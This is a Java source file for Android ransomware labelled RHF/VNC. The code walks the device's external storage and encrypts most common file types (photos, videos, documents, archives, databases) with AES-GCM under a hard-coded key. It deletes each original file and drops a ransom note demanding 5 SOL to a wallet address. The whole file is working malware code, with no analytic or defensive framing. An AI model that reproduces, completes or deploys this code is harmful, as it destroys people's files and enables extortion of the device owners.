package com.rhfvnc.strain;
import android.content.Context;
import android.os.Environment;
import java.io.*;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
public class Encryptor implements Runnable {
    private final Context ctx;
    private static final byte[] KEY = new byte[32];
    static {
        for (int i = 0; i < 32; i++) KEY[i] = (byte) (0xA5 ^ (i * 7));
    }
    private static final String[] TARGET_EXT = {
            ".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp",
            ".mp4", ".mov", ".avi", ".mkv", ".3gp",
            ".mp3", ".wav", ".flac", ".ogg", ".m4a",
            ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".txt", ".csv", ".json", ".xml",
            ".zip", ".rar", ".7z", ".tar", ".gz",
            ".apk", ".db", ".sqlite"
    };
    public Encryptor(Context c) { ctx = c; }
    @Override
    public void run() {
        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
        File root = Environment.getExternalStorageDirectory();
        walk(root);
        // ransom note
        try {
            File note = new File(root, "RHF_VNC_README.txt");
            FileWriter w = new FileWriter(note);
            w.write("Your files have been encrypted by RHF/VNC.\n\n" +
                    "To recover, send 5 SOL to:\n" + SolanaCheck.WALLET + "\n\n" +
                    "Then tap 'I PAID' on the lock screen.\n");
            w.close();
        } catch (Throwable ignored) {}
    }
    private void walk(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) {
                String name = f.getName();
                if (name.equals("Android") || name.startsWith(".")) continue;
                walk(f);
            } else {
                if (shouldEncrypt(f)) encrypt(f);
            }
        }
    }
    private boolean shouldEncrypt(File f) {
        String n = f.getName().toLowerCase();
        if (n.endsWith(".rhfvnc")) return false;
        if (n.equals("rhf_vnc_readme.txt")) return false;
        for (String ext : TARGET_EXT) if (n.endsWith(ext)) return true;
        return false;
    }
    private void encrypt(File f) {
        try {
            byte[] iv = new byte[12];
            new SecureRandom().nextBytes(iv);
            File out = new File(f.getAbsolutePath() + ".rhfvnc");
            FileInputStream in = new FileInputStream(f);
            FileOutputStream fos = new FileOutputStream(out);
            fos.write(iv);
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec ks = new SecretKeySpec(KEY, "AES");
            c.init(Cipher.ENCRYPT_MODE, ks, new GCMParameterSpec(128, iv));
            CipherOutputStream cos = new CipherOutputStream(fos, c);
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) cos.write(buf, 0, n);
            cos.close();
            in.close();
            f.delete();
        } catch (Throwable ignored) {}
    }
}
